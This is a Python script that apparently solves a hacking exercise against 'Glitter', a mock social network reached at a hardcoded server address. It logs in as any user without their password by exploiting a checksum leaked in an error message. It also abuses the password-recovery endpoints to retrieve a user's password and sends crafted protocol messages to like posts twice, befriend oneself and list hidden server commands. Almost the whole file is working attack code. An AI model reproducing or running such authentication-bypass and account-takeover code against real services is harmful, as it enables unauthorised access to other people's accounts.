import socket
import requests

SERVER_ADDRESS = ("44.224.228.136", 1336)
RECV_SIZE = 4096

# PASSWORD CHALLENGE
PASSWORD_USERNAME_INPUT = 'http://glitter.org.il/password-recovery-code-request/'
PASSWORD_CODE_INPUT = 'http://glitter.org.il/password-recovery-code-verification/'
USERNAME_FORMAT = '"%s"'
CODE_FORMAT = {'username': '%s', 'code': '%s'}
HEADERS = {'Host': 'glitter.org.il', 'Connection': 'keep-alive', 'Content-Length': '9', 'Accept': 'application/json, text/plain, */*',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36', 'Content-Type': 'application/json', 'Origin': 'http://glitter.org.il', 'Referer': 'http://glitter.org.il/password-recovery', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7'}

# LOGIN CHALLENGE
LOGIN_ERR_FORMAT = '108#Illegal user login. Provided details do not match ascii checksum: '
GLITTER_DELIMITER = '{gli&&er}'
CHECKSUM = 0

def glitterClientLogin(username: str, sock) -> str:
    """ This function gets a username and a socket and logs into the Glitter client"""
    try:
        # Send the login request to the server.
        sock.sendall(('''100#{gli&&er}{"user_name":"%s","password":" ","enable_push_notifications":true}##''' % username).encode())

        server_message = sock.recv(RECV_SIZE).decode()

        if "Username doesn't exist" in server_message:
            raise ValueError

        # Receive the server message.
        server_message = server_message.split(LOGIN_ERR_FORMAT)[1]

        server_message = server_message.split(GLITTER_DELIMITER)

        checksum = server_message[CHECKSUM]

        ascii_password = int(checksum) - usernameAsciiSum(username)

        # Send the login request to the server.
        sock.sendall(('''100#{gli&&er}{"user_name":"%s","password":"%s","enable_push_notifications":true}##''' % (username, chr(ascii_password))).encode())

        # Receive the server message.
        server_message = sock.recv(RECV_SIZE).decode()

        sock.sendall(('''110#{gli&&er}%s##''' % checksum).encode())
        server_message = sock.recv(RECV_SIZE).decode()

        return server_message
    except ValueError:
        print("Error: The username might be incorrect!")
    except:
        return ''
    
def usernameAsciiSum(username: str) -> int:
    """ This function gets a username and calculates the ascii sum of its characters"""
    ascii_sum = 0

    for c in username:
        ascii_sum += ord(c)
    
    return ascii_sum


def passwordChallenge(username: str, code: str) -> str:
    """ This function gets a username and a "forgot a password" code and gets the password of a user """
    requests.post(url = PASSWORD_USERNAME_INPUT, headers = HEADERS, data = USERNAME_FORMAT % username)

    response = requests.post(url = PASSWORD_CODE_INPUT, json = [CODE_FORMAT['username'] % username, CODE_FORMAT['code'] % code])

    if "Password Recovery Error" in response.text:
        return "Something went wrong."

    return response.text


def getUserId(username: str, sock) -> str:
    """ This function gets a username and a socket and returns the user id."""    
    msg = glitterClientLogin(username, sock)

    try:
        if "Authentication approved" in msg:
            msg = msg.split(',"id":')

            return msg[1].split(',')[0]
        return ''
    except:
        return ''


def changeFontColor(username: str, sock):
    """ This function uploads a glit with an invalid font color."""
    id = getUserId(username, sock)

    message = '''550#{gli&&er}{"feed_owner_id":%s,"publisher_id":%s,"publisher_screen_name":"ericlapton","publisher_avatar":"im4","background_color":"White","date":"2022-06-05T10:51:32.928Z","content":"LIKE TWICE!","font_color":"yellow","id":-1}##''' % (id, id)

    glitterClientLogin(username, sock)

    sock.sendall(message.encode())

def sendFriendRequest(username: str, sock):
    """ This function gets a username and a socket and sends a friend request to the user himself. """
    id = getUserId(username, sock)

    message = '''410#{gli&&er}[%s,%s]##''' % (id, id)

    sock.sendall(message.encode())

def sendLikeTwice(username: str, sock, glitID):
    """ This function sends a like request to a glit as many times as we want (twice, in this case) """
    id = getUserId(username, sock)

    # Craft the message to send to the server.
    message = '''710#{gli&&er}{"glit_id":%s,"user_id":%s,"user_screen_name":"no no","id":-1}##''' % (glitID, id)

    sock.sendall(message.encode())
    sock.sendall(message.encode())

def showAllCommands(sock):
    """ This function shows all commands that the server can do """
    message = '''900#{gli&&er}{"user_name":"","password":"","enable_push_notifications":true}##'''

    sock.sendall(message.encode())

    return sock.recv(RECV_SIZE).decode()

def search(sock, entry, username):
    """ This function gets a search entry and searches for users in the database """
    message = '''300#{gli&&er}{"search_type":"SIMPLE","search_entry":"%s"}##''' % entry

    glitterClientLogin(username, sock)

    sock.sendall(message.encode())

    return sock.recv(RECV_SIZE).decode()

def publish_wow(sock, username, glitID):
    message = '''750#{gli&&er}{"glit_id":%s,"user_id":%s,"user_screen_name":""}##''' % (glitID, getUserId(username, sock))

    glitterClientLogin(username, sock)

    sock.sendall(message.encode())

    return sock.recv(RECV_SIZE).decode()
